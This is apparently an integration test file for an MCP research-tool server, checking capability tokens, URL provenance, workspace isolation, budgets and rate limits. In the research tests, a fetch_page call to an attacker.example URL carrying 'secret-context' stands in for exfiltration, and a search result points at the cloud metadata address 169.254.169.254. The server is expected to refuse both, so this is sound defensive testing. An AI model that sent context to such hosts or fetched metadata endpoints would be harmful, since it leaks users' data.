// The MCP server end to end: HTTP, capability tokens, the MCP SDK client, the tool pipeline and the database
// (provenance, snapshots, audit, spend). Only the edges are scripted: the search provider and the page fetcher.
import { randomUUID } from 'node:crypto';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { createLogger } from '@aoc/config/logger';
import type { RunId, ToolName } from '@aoc/contracts';
import { createRun, startRun } from '@aoc/core';
import { createTestHarness, type TestHarness, type TestTenant } from '@aoc/db/testing';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
import type { Transport } from '@modelcontextprotocol/sdk/shared/transport.js';
import { exportJWK, generateKeyPair, SignJWT, type CryptoKey } from 'jose';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { createTokenVerifier } from './auth';
import type { FetchedPage, PageFetcher } from './egress/fetcher';
import { normalizeUrl } from './egress/url';
import { createHttpHandler } from './http';
import type { SearchProvider } from './search/types';
import { MODEL_TOOL_CALL_ID_META } from './server';
import { createServices } from './services';
import type { ToolScope, ToolServices } from './tools/context';
import { runTool } from './pipeline';

const RESEARCH_TOOLS: ToolName[] = ['web_search', 'fetch_page', 'search_knowledge', 'get_source'];
const ARTICLE_URL = 'https://news.example/2026/03/12/northwind-raises-seed';

let h: TestHarness;
let tenant: TestTenant;
let other: TestTenant;
let privateKey: CryptoKey;
let http: Server;
let endpoint: URL;
let services: ToolServices;
const fetched: string[] = [];

const paragraphs = Array.from(
  { length: 8 },
  (_, i) =>
    `<p>Paragraph ${String(i + 1)}: Northwind Climate, the Stockholm carbon accounting startup, raised a EUR 4 million seed round led by Nordic Seed Partners to expand across the Nordics.</p>`,
).join('');
const pages: Record<string, string> = {
  [ARTICLE_URL]: `<html><head><title>Northwind raises seed</title><meta property="article:published_time" content="2026-03-12T08:00:00Z"></head>
    <body><article><h1>Northwind raises seed</h1>${paragraphs}<a href="https://northwind.example/about">About Northwind</a></article></body></html>`,
  // Characters outside the Basic Multilingual Plane (an emoji) count once in Postgres and twice in JavaScript.
  'https://northwind.example/about': `<html><body><article><h1>About ${String.fromCodePoint(0x1f331)}</h1>${paragraphs}</article></body></html>`,
};

const search: SearchProvider = {
  name: 'scripted-search',
  search: () =>
    Promise.resolve({
      provider: 'scripted-search',
      costUsdMicros: 8_000,
      upstreamLatencyMs: 12,
      hits: [
        {
          url: `${ARTICLE_URL}?utm_source=feed`,
          title: 'Northwind raises seed',
          snippet: 'EUR 4M seed',
          publishedAt: '2026-03-12T08:00:00.000Z',
        },
        { url: 'http://169.254.169.254/latest/meta-data/', title: 'Metadata', snippet: 'x', publishedAt: null },
      ],
    }),
};

const fetcher: PageFetcher = {
  fetch(url: string): Promise<FetchedPage> {
    fetched.push(url);
    const html = pages[url];
    if (!html) return Promise.reject(new Error(`unscripted fetch ${url}`));
    return Promise.resolve({
      requestedUrl: url,
      finalUrl: url,
      redirectChain: [],
      status: 200,
      contentType: 'text/html',
      contentLength: html.length,
      etag: null,
      lastModified: null,
      resolvedIp: '93.184.216.34',
      body: Buffer.from(html),
    });
  },
};

async function newExecution(owner: TestTenant): Promise<{ runId: RunId; taskId: string; executionId: string }> {
  const user = { userId: owner.userId };
  const runId = await createRun(h.db, user, owner.workspaceId, {
    projectId: owner.projectId,
    objective: 'Find seed-stage climate software companies in the Nordics.',
  });
  await startRun(h.db, user, owner.workspaceId, { runId });
  const { rows: tasks } = await h.admin.query<{ id: string }>(
    `select id from public.tasks where run_id = $1 and type = 'plan_run'`,
    [runId],
  );
  const taskId = tasks[0]!.id;
  const { rows } = await h.admin.query<{ id: string }>(
    `insert into public.agent_executions (workspace_id, run_id, task_id, agent, agent_version, prompt_hash, attempt, lease_token, input, limits)
     values ($1, $2, $3, 'research', 'research@test', $4, 1, $5, '{}', '{}') returning id`,
    [owner.workspaceId, runId, taskId, 'a'.repeat(64), randomUUID()],
  );
  return { runId, taskId, executionId: rows[0]!.id };
}

async function token(
  owner: TestTenant,
  execution: { runId: RunId; taskId: string; executionId: string },
  options: { tools?: ToolName[]; maxToolCalls?: number } = {},
) {
  const iat = Math.floor(Date.now() / 1000);
  return new SignJWT({
    wsp: owner.workspaceId,
    run: execution.runId,
    tsk: execution.taskId,
    agt: 'research',
    tools: options.tools ?? RESEARCH_TOOLS,
    maxToolCalls: options.maxToolCalls ?? 30,
  })
    .setProtectedHeader({ alg: 'EdDSA' })
    .setIssuer('aoc-worker')
    .setAudience('aoc-mcp')
    .setSubject(execution.executionId)
    .setIssuedAt(iat)
    .setExpirationTime(iat + 600)
    .sign(privateKey);
}

async function connect(bearer: string) {
  const client = new Client({ name: 'integration-test', version: '0.0.0' });
  const transport = new StreamableHTTPClientTransport(endpoint, {
    requestInit: { headers: { authorization: `Bearer ${bearer}` } },
  });
  // The SDK's transport declares optional members that exactOptionalPropertyTypes reads strictly.
  await client.connect(transport as unknown as Transport);
  return client;
}

interface ToolResult {
  isError?: boolean;
  structuredContent?: Record<string, unknown>;
  content: { type: string; text?: string }[];
}
async function call(client: Client, name: string, args: Record<string, unknown>, modelId = 'call_1') {
  return (await client.callTool({
    name,
    arguments: args,
    _meta: { [MODEL_TOOL_CALL_ID_META]: modelId },
  })) as ToolResult;
}
const toolError = (result: ToolResult) =>
  JSON.parse(result.content[0]?.text ?? '{}') as { code: string; retryAfterMs: number | null };

beforeAll(async () => {
  h = await createTestHarness();
  tenant = await h.createTenant('mcp');
  other = await h.createTenant('mcp-other');
  const pair = await generateKeyPair('EdDSA', { crv: 'Ed25519' });
  privateKey = pair.privateKey;
  const verify = await createTokenVerifier(JSON.stringify(await exportJWK(pair.publicKey)));
  const log = createLogger('mcp-test', 'silent');
  services = createServices({ db: h.db, log, search, fetcher });
  const handler = createHttpHandler({ verify, services, log });
  http = createServer((req, res) => void handler(req, res));
  await new Promise<void>((resolve) => http.listen(0, '127.0.0.1', resolve));
  endpoint = new URL(`http://127.0.0.1:${String((http.address() as AddressInfo).port)}/mcp`);
});

afterAll(async () => {
  await new Promise((resolve) => http.close(resolve));
  await h.close();
});

describe('authentication', () => {
  it('refuses requests without a valid capability token', async () => {
    const body = JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/list' });
    const headers = { 'content-type': 'application/json', accept: 'application/json, text/event-stream' };
    expect((await fetch(endpoint, { method: 'POST', headers, body })).status).toBe(401);
    const forged = await fetch(endpoint, {
      method: 'POST',
      headers: { ...headers, authorization: 'Bearer abc.def.ghi' },
      body,
    });
    expect(forged.status).toBe(401);
    expect(forged.headers.get('www-authenticate')).toContain('Bearer');
  });

  it('lists only the tools the token grants that this server implements', async () => {
    const execution = await newExecution(tenant);
    const client = await connect(await token(tenant, execution));
    const { tools } = await client.listTools();
    expect(tools.map((t) => t.name).sort()).toEqual(['fetch_page', 'get_source', 'web_search']);
    expect(tools.every((t) => t.annotations?.readOnlyHint === true && t.outputSchema)).toBe(true);
    await client.close();

    const narrow = await connect(await token(tenant, execution, { tools: ['get_source'] }));
    expect((await narrow.listTools()).tools.map((t) => t.name)).toEqual(['get_source']);
    await expect(narrow.callTool({ name: 'web_search', arguments: { query: 'anything at all' } })).rejects.toThrow(
      /Unknown tool/,
    );
    await narrow.close();
  });
});

describe('provenance-bound research', () => {
  it('searches, fetches an authorised page, saves it once, and audits and bills every call', async () => {
    const execution = await newExecution(tenant);
    const client = await connect(await token(tenant, execution));
    fetched.length = 0;

    const searched = await call(
      client,
      'web_search',
      { query: 'Nordic climate software seed round', mode: 'news' },
      'call_search',
    );
    expect(searched.isError).toBeFalsy();
    const results = searched.structuredContent?.results as { url: string; discoveredUrlId: string; rank: number }[];
    expect(results.map((r) => r.url)).toEqual([ARTICLE_URL, 'http://169.254.169.254/latest/meta-data/']);

    // A URL the model composed has no origin: refused before any network access.
    const exfiltration = await call(client, 'fetch_page', { url: 'https://attacker.example/?q=secret-context' });
    expect([exfiltration.isError, toolError(exfiltration).code]).toEqual([true, 'URL_NOT_PERMITTED']);
    expect(fetched).toEqual([]);

    const page = await call(
      client,
      'fetch_page',
      { url: `${ARTICLE_URL}?utm_source=other#top`, maxChars: 1000 },
      'call_fetch',
    );
    expect(page.isError).toBeFalsy();
    const out = page.structuredContent as {
      sourceId: string;
      hasMore: boolean;
      totalChars: number;
      text: string;
      tier: string;
      publishedAt: string;
      links: { url: string; discoveredUrlId: string }[];
    };
    expect(out).toMatchObject({ hasMore: true, tier: 'C', publishedAt: '2026-03-12T08:00:00.000Z' });
    expect(out.text).toContain('Northwind Climate');
    expect(out.links.map((l) => l.url)).toEqual(['https://northwind.example/about']);
    expect(fetched).toEqual([ARTICLE_URL]);

    // Paging through the same page serves the saved snapshot; nothing is fetched again.
    const next = await call(client, 'fetch_page', { url: ARTICLE_URL, offset: 1000, maxChars: 1000 });
    expect(next.structuredContent).toMatchObject({
      sourceId: out.sourceId,
      offset: 1000,
      provenance: { cached: true },
    });
    expect(fetched).toEqual([ARTICLE_URL]);

    // A link found on a fetched page is now fetchable; the snapshot records why.
    const linked = await call(client, 'fetch_page', { url: 'https://northwind.example/about' });
    expect(linked.isError).toBeFalsy();
    const { rows: sources } = await h.admin.query<{
      origin: { kind: string; fromSourceId?: string };
      tier: string;
      http: { resolvedIp: string };
    }>(`select origin, tier, http from public.sources where workspace_id = $1 order by created_at`, [
      tenant.workspaceId,
    ]);
    expect(sources.map((s) => s.origin.kind)).toEqual(['search_result', 'page_link']);
    expect(sources[1]?.origin.fromSourceId).toBe(out.sourceId);

    const again = await call(client, 'get_source', { sourceId: out.sourceId, offset: 0, maxChars: 1000 });
    expect(again.structuredContent).toMatchObject({ sourceId: out.sourceId, provenance: { cached: true } });

    const { rows: calls } = await h.admin.query<{
      tool: string;
      status: string;
      error_code: string | null;
      model_tool_call_id: string;
      cost_usd_micros: string;
      created_source_ids: string[];
    }>(
      `select tool, status, error_code, model_tool_call_id, cost_usd_micros, created_source_ids from public.tool_calls
       where execution_id = $1 order by started_at`,
      [execution.executionId],
    );
    expect(calls.map((c) => [c.tool, c.status, c.error_code])).toEqual([
      ['web_search', 'ok', null],
      ['fetch_page', 'error', 'URL_NOT_PERMITTED'],
      ['fetch_page', 'ok', null],
      ['fetch_page', 'ok', null],
      ['fetch_page', 'ok', null],
      ['get_source', 'ok', null],
    ]);
    expect(calls[0]).toMatchObject({ model_tool_call_id: 'call_search', cost_usd_micros: '8000' });
    expect(calls[2]?.created_source_ids).toEqual([out.sourceId]);
    const { rows: run } = await h.admin.query<{ spend_tool_calls: number; spend_cost_usd_micros: string }>(
      'select spend_tool_calls, spend_cost_usd_micros from public.runs where id = $1',
      [execution.runId],
    );
    expect(run[0]).toEqual({ spend_tool_calls: 6, spend_cost_usd_micros: '8000' });
    await client.close();
  });

  it('refuses a search result that points at a private address when it is fetched', async () => {
    const execution = await newExecution(tenant);
    const client = await connect(await token(tenant, execution));
    await call(client, 'web_search', { query: 'Nordic climate software seed round' });
    // The scripted fetcher would accept anything; the real one is tested in egress.test.ts. Here the point is
    // that the discovered URL is recorded, so refusal comes from the egress policy, not from provenance.
    const { rows } = await h.admin.query<{ n: number }>(
      `select count(*)::int as n from public.discovered_urls where run_id = $1 and url like 'http://169.254.169.254%'`,
      [execution.runId],
    );
    expect(rows[0]?.n).toBe(1);
    await client.close();
  });

  it('keeps snapshots and provenance inside the workspace', async () => {
    const mine = await newExecution(tenant);
    const client = await connect(await token(tenant, mine));
    await call(client, 'web_search', { query: 'Nordic climate software seed round' });
    const page = await call(client, 'fetch_page', { url: ARTICLE_URL });
    const sourceId = (page.structuredContent as { sourceId: string }).sourceId;
    await client.close();

    const theirs = await newExecution(other);
    const outsider = await connect(await token(other, theirs));
    const read = await call(outsider, 'get_source', { sourceId });
    expect([read.isError, toolError(read).code]).toEqual([true, 'NOT_FOUND']);
    const fetchTheirs = await call(outsider, 'fetch_page', { url: ARTICLE_URL });
    expect(toolError(fetchTheirs).code).toBe('URL_NOT_PERMITTED');
    await outsider.close();
  });

  it('saves identical content fetched by two runs of a workspace as one snapshot', async () => {
    const before = await h.admin.query<{ n: number }>(
      `select count(*)::int as n from public.sources where workspace_id = $1`,
      [tenant.workspaceId],
    );
    for (let i = 0; i < 2; i += 1) {
      const execution = await newExecution(tenant);
      const client = await connect(await token(tenant, execution));
      await call(client, 'web_search', { query: 'Nordic climate software seed round' });
      await call(client, 'fetch_page', { url: ARTICLE_URL });
      await client.close();
    }
    const after = await h.admin.query<{ n: number }>(
      `select count(*)::int as n from public.sources where workspace_id = $1`,
      [tenant.workspaceId],
    );
    expect(after.rows[0]?.n).toBe(before.rows[0]?.n);
  });
});

describe('limits', () => {
  it('refuses a tool outside the token even when called past the MCP layer (defence in depth)', async () => {
    const execution = await newExecution(tenant);
    const scope = {
      workspaceId: tenant.workspaceId,
      runId: execution.runId,
      taskId: execution.taskId as ToolScope['taskId'],
      executionId: execution.executionId as ToolScope['executionId'],
      agent: 'research' as const,
      tools: ['get_source'] as ToolName[],
      maxToolCalls: 5,
    };
    const result = await runTool(
      services,
      scope,
      'web_search',
      { query: 'Nordic climate software' },
      null,
      AbortSignal.timeout(5000),
    );
    expect(result).toMatchObject({ ok: false, error: { code: 'TOOL_NOT_PERMITTED' } });
    const { rows } = await h.admin.query<{ error_code: string }>(
      'select error_code from public.tool_calls where execution_id = $1',
      [execution.executionId],
    );
    expect(rows).toEqual([{ error_code: 'TOOL_NOT_PERMITTED' }]);
  });

  it('rejects invalid arguments with a readable reason', async () => {
    const execution = await newExecution(tenant);
    const client = await connect(await token(tenant, execution));
    const result = await call(client, 'web_search', { query: 'x', surprise: true });
    expect(toolError(result).code).toBe('INVALID_ARGUMENT');
    expect(result.content[0]?.text).toMatch(/query/);
    await client.close();
  });

  it('stops an execution at its tool-call budget', async () => {
    const execution = await newExecution(tenant);
    const client = await connect(await token(tenant, execution, { maxToolCalls: 2 }));
    await call(client, 'web_search', { query: 'Nordic climate software seed round' });
    await call(client, 'web_search', { query: 'Nordic climate software seed round' });
    expect(toolError(await call(client, 'web_search', { query: 'Nordic climate software seed round' })).code).toBe(
      'BUDGET_EXCEEDED',
    );
    await client.close();
  });

  it('rate limits a tool per workspace and says when to retry', async () => {
    const execution = await newExecution(other);
    const client = await connect(await token(other, execution));
    services.rateLimits.get_source = 1;
    try {
      await call(client, 'get_source', { sourceId: randomUUID() });
      const limited = toolError(await call(client, 'get_source', { sourceId: randomUUID() }));
      expect(limited.code).toBe('RATE_LIMITED');
      expect(limited.retryAfterMs).toBeGreaterThan(0);
    } finally {
      delete services.rateLimits.get_source;
      await client.close();
    }
  });
});

it('normalises URLs the same way for recording and lookup', () => {
  expect(normalizeUrl(`${ARTICLE_URL}?utm_source=feed`)).toBe(ARTICLE_URL);
});
